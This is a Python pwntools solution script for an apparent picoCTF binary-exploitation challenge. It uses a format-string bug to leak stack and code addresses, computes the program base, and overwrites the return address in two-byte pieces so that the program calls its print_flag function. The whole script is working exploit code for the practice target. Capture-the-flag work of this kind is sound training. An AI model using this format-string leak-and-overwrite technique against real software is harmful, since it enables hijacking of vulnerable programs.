from pwn import *


context.update(arch='amd64', os='linux') 

pr = remote('shape-facility.picoctf.net', 61785)
# pr = process('./valley')

elf = ELF('./valley')

# gdb.script = '''
    
#     b*echo_valley+248
#     c
# '''
# gdb.attach(pr, gdb.script)

pr.sendline(b'%20$p::%21$p')

pr.recvuntil(b'You heard in the distance: ')
addr = pr.recvline().strip().split(b'::')

ret_addr = int(addr[0], 16) - 8
mainP18_addr = int(addr[1], 16) 
base = mainP18_addr - (elf.symbols['main'] + 18)
print_flag = base + elf.symbols['print_flag']

log.info(f'ret_addr = {hex(ret_addr)}')
log.info(f'main_addr = {hex(mainP18_addr)}')
log.info(f'base = {hex(base)}')
log.info(f'print_flag = {hex(print_flag)}')


# payload = fmtstr_payload(6, {ret_addr: print_flag})
# print(len(fmtstr_payload(6, {ret_addr: print_flag})))   120bytes - too long
# pr.sendline(payload)

chunks = [
    print_flag & 0xffff,
    (print_flag >> 16) & 0xffff, # 2 bytes each
    (print_flag >> 32) & 0xffff, 
    (print_flag >> 48) & 0xffff,
    
]

pr.sendline(fmtstr_payload(6, {ret_addr: chunks[0]}))      
pr.sendline(fmtstr_payload(6, {ret_addr + 2: chunks[1]}))   
pr.sendline(fmtstr_payload(6, {ret_addr + 4: chunks[2]}))
pr.sendline(fmtstr_payload(6, {ret_addr + 6: chunks[3]})) 


pr.interactive()

print(pr.recvall())


